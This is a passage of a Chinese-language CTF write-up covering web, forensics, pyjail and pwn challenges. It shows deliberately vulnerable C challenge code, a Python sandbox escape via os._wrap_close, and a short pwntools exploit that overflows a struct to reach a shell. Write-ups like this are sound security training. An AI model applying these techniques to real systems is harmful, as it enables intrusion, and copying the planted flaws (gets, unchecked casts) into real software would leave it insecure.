class="string">&#x27;scale(0.95)&#x27;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">setTimeout</span>(() =&gt; &#123;</span><br><span class="line">                        this.style.transform = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    &#125;, <span class="number">100</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>用 bonus_code 傳入序列化 array 增加 UR,SSR，然後 sellacc<br><img src="https://hackmd.io/_uploads/rJw55ozkxl.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1OljiGJex.png" alt="image"><br>點出售帳號<br><img src="https://hackmd.io/_uploads/SkPZsifyxx.png" alt="image"></p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="network-noise"><a href="#network-noise" class="headerlink" title="network noise"></a>network noise</h4><p><img src="https://hackmd.io/_uploads/BkrTEnGkex.png" alt="image"><br>用記事本開 capture.pcap<br><img src="https://hackmd.io/_uploads/r1R6QnzJlx.png" alt="image"></p>
<h4 id="Seems-like-someone’s-breaking-down😂"><a href="#Seems-like-someone’s-breaking-down😂" class="headerlink" title="Seems like someone’s breaking down😂"></a>Seems like someone’s breaking down😂</h4><p><img src="https://hackmd.io/_uploads/SkciN2zJgg.png" alt="image"><br>app.log 裡面都是試圖攻擊的紀錄<br>滑到底發現一組登入成功的帳密<br><img src="https://hackmd.io/_uploads/SkM2ShfJex.png" alt="image"><br><img src="https://hackmd.io/_uploads/BymNrhfkxe.png" alt="image"><br>猜真flag可能也在base64<br><img src="https://hackmd.io/_uploads/Bk6882zyxl.png" alt="image"><br>唯一不一樣的<br><img src="https://hackmd.io/_uploads/r1fcLhfkgl.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1Gp82f1xe.png" alt="image"></p>
<h4 id="Setsuna-Message"><a href="#Setsuna-Message" class="headerlink" title="Setsuna Message"></a>Setsuna Message</h4><p><img src="https://hackmd.io/_uploads/S16JwnGJle.png" alt="image"><br><img src="https://hackmd.io/_uploads/SkrlD3Gylg.png" alt="image"><br>GPT 解讀提示的執行和第八層地獄，猜測 Malbolge，這是公認最難寫、最混亂的語言之一<br><img src="https://hackmd.io/_uploads/B1JGd2fkxg.png" alt="image"><br><img src="https://hackmd.io/_uploads/S127_hGyxx.png" alt="image"></p>
<h4 id="Hidden-in-memory…"><a href="#Hidden-in-memory…" class="headerlink" title="Hidden in memory…"></a>Hidden in memory…</h4><p><img src="https://hackmd.io/_uploads/ryjDunMkex.png" alt="image"><br>下載 memdump.rar<br>解壓縮得 memdump.dmp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install volatility3 </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\x\Downloads\ctf\THJCC2\memdump&gt; vol -f .\memdump.dmp windows.info</span><br><span class="line">Volatility 3 Framework 2.11.0</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Variable        Value</span><br><span class="line"></span><br><span class="line">Kernel Base     0xf80646619000</span><br><span class="line">DTB     0x1ad000</span><br><span class="line">Symbols file:///C:/Users/x/AppData/Local/Programs/Python/Python311/Lib/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/89284D0CA6ACC8274B9A44BD5AF9290B-1.json.xz</span><br><span class="line">Is64Bit True</span><br><span class="line">IsPAE   False</span><br><span class="line">layer_name      0 WindowsIntel32e</span><br><span class="line">memory_layer    1 WindowsCrashDump64Layer</span><br><span class="line">base_layer      2 FileLayer</span><br><span class="line">KdVersionBlock  0xf806472283a0</span><br><span class="line">Major/Minor     15.19041</span><br><span class="line">MachineType     34404</span><br><span class="line">KeNumberProcessors      2</span><br><span class="line">SystemTime      2025-03-18 04:04:46+00:00</span><br><span class="line">NtSystemRoot    C:\Windows</span><br><span class="line">NtProductType   NtProductWinNt</span><br><span class="line">NtMajorVersion  10</span><br><span class="line">NtMinorVersion  0</span><br><span class="line">PE MajorOperatingSystemVersion  10</span><br><span class="line">PE MinorOperatingSystemVersion  0</span><br><span class="line">PE Machine      34404</span><br><span class="line">PE TimeDateStamp        Fri May 20 08:24:42 2101</span><br></pre></td></tr></table></figure>
<p>沒有，改找 Registry hive</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\x\Downloads\ctf\THJCC2\memdump&gt; vol -f memdump.dmp windows.registry.hivelist</span><br><span class="line">Volatility 3 Framework 2.11.0</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Offset  FileFullPath    File output</span><br><span class="line"></span><br><span class="line">0xd80b47676000          Disabled</span><br><span class="line">0xd80b4768d000  \REGISTRY\MACHINE\SYSTEM        Disabled</span><br><span class="line">0xd80b47731000  \REGISTRY\MACHINE\HARDWARE      Disabled</span><br><span class="line">0xd80b4a17e000  \Device\HarddiskVolume1\EFI\Microsoft\Boot\BCD  Disabled</span><br><span class="line">0xd80b4a040000  \SystemRoot\System32\Config\SOFTWARE    Disabled</span><br><span class="line">0xd80b4acbe000  \SystemRoot\System32\Config\DEFAULT     Disabled</span><br><span class="line">0xd80b4ae03000  \SystemRoot\System32\Config\SECURITY    Disabled</span><br><span class="line">0xd80b4ae77000  \SystemRoot\System32\Config\SAM Disabled</span><br><span class="line">0xd80b4af90000  \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled</span><br><span class="line">0xd80b4b0b1000  \SystemRoot\System32\Config\BBI Disabled</span><br><span class="line">0xd80b4b114000  \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled</span><br><span class="line">0xd80b4b6b8000  \??\C:\Users\WH3R3-Y0U-G3TM3\ntuser.dat Disabled</span><br><span class="line">0xd80b4b706000  \??\C:\Users\WH3R3-Y0U-G3TM3\AppData\Local\Microsoft\Windows\UsrClass.dat       Disabled</span><br><span class="line">0xd80b4c1df000  \??\C:\Windows\AppCompat\Programs\Amcache.hve   Disabled</span><br><span class="line">0xd80b4cd6a000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.1023_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat Disabled</span><br><span class="line">0xd80b4cd88000  \??\C:\Users\WH3R3-Y0U-G3TM3\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\Settings\settings.dat       Disabled</span><br><span class="line">0xd80b4cdd3000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Search_1.14.9.19041_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat     Disabled</span><br><span class="line">0xd80b4ce8f000  \??\C:\Users\WH3R3-Y0U-G3TM3\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\Settings\settings.dat        Disabled</span><br><span class="line">0xd80b4df8f000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe\ActivationStore.dat        Disabled</span><br><span class="line">0xd80b4ee8e000  \??\C:\Users\WH3R3-Y0U-G3TM3\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\Settings\settings.dat  Disabled</span><br><span class="line">0xd80b4efdc000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\windows.immersivecontrolpanel_10.0.2.1000_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat Disabled</span><br></pre></td></tr></table></figure>
<p><code>C:\Users\WH3R3-Y0U-G3TM3</code> 使用者名稱可能跟電腦名稱一樣<br><code>THJCC&#123;WH3R3-Y0U-G3TM3&#125;</code></p>
<h4 id="Pyjail02"><a href="#Pyjail02" class="headerlink" title="Pyjail02"></a>Pyjail02</h4><p><img src="https://hackmd.io/_uploads/BJ5u2hf1gl.png" alt="image"><br><code>jail.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line"></span><br><span class="line">inpt = unicodedata.normalize(<span class="string">&quot;NFKC&quot;</span>, <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(inpt, &#123;<span class="string">&quot;__builtins__&quot;</span>:&#123;&#125;&#125;, &#123;&#125;))</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HJT7anGJgx.png" alt="image"><br>貼給GPT，得知<br><code>os._wrap_close</code> class 是 os 模組的一部分，可以從這個 class 把 os 模組「拉回來」，然後用 os.system() 或 os.popen() 之類的東西來執行系統指令<br>關鍵字搜尋再數一下，找到 os._wrap_close 的 index 141<br><img src="https://hackmd.io/_uploads/B1lKahGJle.png" alt="image"><br><img src="https://hackmd.io/_uploads/HJ5pAhfJel.png" alt="image"></p>
<h4 id="Pyjail01"><a href="#Pyjail01" class="headerlink" title="Pyjail01"></a>Pyjail01</h4><p><img src="https://hackmd.io/_uploads/ByvXJpfkgx.png" alt="image"><br><code>jail.py</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicodedata, string</span><br><span class="line"></span><br><span class="line">_ = string.ascii_letters</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    inpt = unicodedata.normalize(<span class="string">&quot;NFKC&quot;</span>, <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inpt:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> _:</span><br><span class="line">            <span class="keyword">raise</span> NameError(<span class="string">&quot;No ASCII letters!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exec</span>(inpt)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BJT1laGJeg.png" alt="image"></p>
<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="Flag-Shopping"><a href="#Flag-Shopping" class="headerlink" title="Flag Shopping"></a>Flag Shopping</h4><p>chal.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;            Welcome to the FLAG SHOP!!!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;===================================================\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> money = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span> price[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">123456789</span>&#125;;</span><br><span class="line">	<span class="type">int</span> own[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">	<span class="type">int</span> option = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Which one would you like? (enter the serial number)\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;1. Coffee\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;2. Tea\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;3. Flag\n&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;option);</span><br><span class="line">		<span class="keyword">if</span> (option &lt; <span class="number">1</span> || option &gt; <span class="number">3</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;invalid option\n&quot;</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;How many do you need?\n&gt; &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;num);</span><br><span class="line">		<span class="keyword">if</span> (num &lt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;invalid number\n&quot;</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (money &lt; price[option]*(<span class="type">int</span>)num)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;You only have %d, &quot;</span>, money);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;But it cost %d * %d = %d\n&quot;</span>, price[option], (<span class="type">int</span>)num, price[option]*(<span class="type">int</span>)num);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		money -= price[option]*(<span class="type">int</span>)num;</span><br><span class="line">		own[option] += num;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (own[<span class="number">3</span>])&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 2147483647//123456789</span><br><span class="line">17</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rJ8xV071ex.png" alt="image"></p>
<h4 id="Money-Overflow"><a href="#Money-Overflow" class="headerlink" title="Money Overflow"></a>Money Overflow</h4><p>chal.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> money;</span><br><span class="line">&#125; customer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shop</span><span class="params">(<span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span>(choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> (customer.money &gt;= <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                customer.money -= <span class="number">100</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here is your cake: %s&quot;</span>, <span class="string">&quot;🍰\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Not enough money QQ\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> (customer.money &gt;= <span class="number">50</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                customer.money -= <span class="number">50</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here is your bun: %s&quot;</span>, <span class="string">&quot;🥖\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Not enough money QQ\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> (customer.money &gt;= <span class="number">25</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                customer.money -= <span class="number">25</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here is your cookie: %s&quot;</span>, <span class="string">&quot;🍪\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Not enough money QQ\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> (customer.money &gt;= <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                customer.money -= <span class="number">10</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here is your water: %s&quot;</span>, <span class="string">&quot;💧\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Not enough money QQ\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">if</span> (customer.money &gt;= <span class="number">65535</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Not enough money QQ\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Not an available choice\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (customer.money &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No money QQ\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    customer.id = <span class="number">1</span>;</span><br><span class="line">    customer.money = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">    gets(customer.name);</span><br><span class="line">    <span class="type">int</span> choice; </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1) cake 100$\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2) bun 50$\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3) cookie 25$\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4) water 15$\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;5) get shell 65535$\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your money : %d$\n&quot;</span>, customer.money);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Buy &gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        shop(choice);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chal.ctf.scint.org&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;\xff\xff&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/Hyx3LC71xe.png" alt="image"></p>
<h4 id="Insecure-Shell"><a href="#Insecure-Shell" class="headerlink" title="Insecure Shell"></a>Insecure Shell</h4><p>chal.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_password</span><span class="params">(<span class="type">char</span> *password, <span class="type">char</span> *buf, <span class="type">int</span> buf_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; buf_len; i++)</span><br><span class="line">        <span class="keyword">if</span> (password[i] != buf[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> password[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span 